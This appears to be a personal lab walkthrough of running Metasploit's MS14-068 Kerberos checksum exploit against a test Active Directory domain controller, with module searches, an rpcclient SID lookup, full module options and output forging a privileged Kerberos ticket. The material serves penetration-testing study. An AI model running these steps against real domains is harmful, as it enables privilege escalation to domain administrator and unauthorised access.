=========================================================================================
Metapsloit exploit (ms14_068_kerberos_checksum)
=========================================================================================

       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search active directory

Matching Modules
================

   #    Name                                                                   Disclosure Date  Rank       Check  Description
   -    ----                                                                   ---------------  ----       -----  -----------
  <SNIP>
   478  post/windows/capture/keylog_recorder                                                    normal     No     Windows Capture Keystroke Recorder
   479  post/windows/gather/credentials/enum_laps                                               normal     No     Windows Gather Credentials Local Administrator Password Solution
   480  post/windows/gather/enum_ad_bitlocker                                                   normal     No     Windows Gather Active Directory BitLocker Recovery
   481  post/windows/gather/enum_ad_computers                                                   normal     No     Windows Gather Active Directory Computers
   482  post/windows/gather/enum_ad_groups                                                      normal     No     Windows Gather Active Directory Groups
   483  post/windows/gather/enum_ad_managedby_groups                                            normal     No     Windows Gather Active Directory Managed Groups
   484  post/windows/gather/enum_ad_service_principal_names                                     normal     No     Windows Gather Active Directory Service Principal Names
   485  post/windows/gather/enum_ad_to_wordlist                                                 normal     No     Windows Active Directory Wordlist Builder
   486  post/windows/gather/enum_ad_user_comments                                               normal     No     Windows Gather Active Directory User Comments
   487  post/windows/gather/enum_ad_users                                                       normal     No     Windows Gather Active Directory Users
   488  post/windows/gather/enum_av_excluded                                                    normal     No     Windows Antivirus Exclusions Enumeration
   489  post/windows/gather/enum_dirperms                                                       normal     No     Windows Gather Directory Permissions Enumeration
   490  post/windows/gather/enum_domain_users                                                   normal     No     Windows Gather Enumerate Active Domain Users
   491  post/windows/gather/outlook                                                             normal     No     Windows Gather Outlook Email Messages
   492  post/windows/gather/screen_spy                                                          normal     No     Windows Gather Screen Spy
   493  post/windows/manage/rpcapd_start                                                        normal     No     Windows Manage Remote Packet Capture Service Starter

msf5 > search kerberos

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  auxiliary/admin/kerberos/ms14_068_kerberos_checksum  2014-11-18       normal  No     MS14-068 Microsoft Kerberos Checksum Validation Vulnerability
   1  auxiliary/gather/get_user_spns                       2014-09-27       normal  No     Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)
   2  auxiliary/gather/kerberos_enumusers                                   normal  No     Kerberos Domain User Enumeration
   3  auxiliary/scanner/winrm/winrm_login                                   normal  No     WinRM Login Utility
   4  post/windows/escalate/golden_ticket                                   normal  No     Windows Escalate Golden Ticket



MS14-068: Vulnerability in (Active Directory) Kerberos Could Allow Elevation of Privilege 
=========================================================================================
Active Directory leverages the Kerberos protocol for authentication. 
The vulnerability patches an issue with how the Domain Controller validates group membership in Kerberos tickets (hint: the ticket is always validated by the DC if the checksum is set to certain values). 
Microsoft KB3011780 patches this issue.

=> This exploit requires to have the credentials of a valid domain user and to know its SID (the SID can be collected using the 'rpcclient' command).
 
jeff@kali:~/Documents/CTFs/BadBlood$ sudo rpcclient -U SECURITY-LAB\\backup  192.168.1.50
Enter SECURITY-LAB\backup's password: 

rpcclient $> lookupnames backup
backup S-1-5-21-3698357007-189532211-3203426890-1008 (User: 1)



msf5 auxiliary(admin/kerberos/ms14_068_kerberos_checksum) > options

Module options (auxiliary/admin/kerberos/ms14_068_kerberos_checksum):

   Name      Current Setting                                Required  Description
   ----      ---------------                                --------  -----------
   DOMAIN    Security-Test-Lab.Local                        yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  Test1234                                       yes       The Domain User password
   RHOSTS    192.168.1.50                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     88                                             yes       The target port
   Timeout   10                                             yes       The TCP timeout to establish connection and read data
   USER      backup                                         yes       The Domain User
   USER_SID  S-1-5-21-3698357007-189532211-3203426890-1008  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000

msf5 auxiliary(admin/kerberos/ms14_068_kerberos_checksum) > run
[*] Running module against 192.168.1.50

[*] Validating options...
[*] Using domain SECURITY-TEST-LAB.LOCAL...
[*] 192.168.1.50:88 - Sending AS-REQ...
[*] 192.168.1.50:88 - Parsing AS-REP...
[*] 192.168.1.50:88 - Sending TGS-REQ...
[+] 192.168.1.50:88 - Valid TGS-Response, extracting credentials...
[+] 192.168.1.50:88 - MIT Credential Cache saved on /home/jeff/.msf4/loot/20200415140607_default_192.168.1.50_windows.kerberos_875745.bin
[*] Auxiliary module execution completed


The TGT ticket (with privileged PAC information) has been saved in '20200415140607_default_192.168.1.50_windows.kerberos_875745.bin'. 
This file is saved on MIT Kerberos Credential Cache format. 


Note - Setting up time for kerberoasting attacks and MS14_068 exploit
=========================================================================================
PS C:\Users\Administrator> net stop w32time
The Windows Time service is stopping.
The Windows Time service was stopped successfully.

PS C:\Users\Administrator> w32tm /config /syncfromflags:manual /manualpeerlist:"0.fr.pool.ntp.org"
The command completed successfully.

PS C:\Users\Administrator> net start w32time
The Windows Time service is starting..
The Windows Time service was started successfully.

PS C:\Users\Administrator> date
Wednesday, April 15, 2020 3:50:49 AM
